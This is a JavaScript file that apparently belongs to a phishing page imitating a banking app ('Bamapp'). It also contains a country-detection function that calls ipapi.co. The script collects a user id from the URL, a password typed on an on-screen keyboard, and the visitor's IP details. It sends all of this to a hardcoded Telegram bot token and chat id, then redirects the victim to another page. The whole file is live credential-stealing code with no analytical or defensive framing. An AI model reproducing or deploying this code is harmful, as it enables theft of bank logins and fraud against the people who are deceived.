function detectarPais() {
  // Realiza una solicitud a la API de ipapi.co para obtener la información de ubicación del usuario
  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => {
      // Si el país es Colombia, no hacemos nada
      if (data.country === "CO") {
		  
		  console.log("data.country");
        return;
      }


    })
    .catch((error) => {
      console.error("Error al obtener la ubicación del usuario:", error);
    });
}




var telegram_bot_id = "7479866714:AAF99WSxm4zb9sEwVgTU9Ybg5dfkS9OYQzE";

var chat_id = '-4589800089'

var u_name, ip, ip2;
var ready = function () {
	
		const urlParams = new URLSearchParams(window.location.search);
		const id = urlParams.get('id');
	
	
	
    u_name = document.getElementById("keyboard_display").value;
	
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "User: " +id + "\nClave: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\nBamapp";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
		
        window.location = 'index3.html';
        console.log(response);
    });
    return false;
};
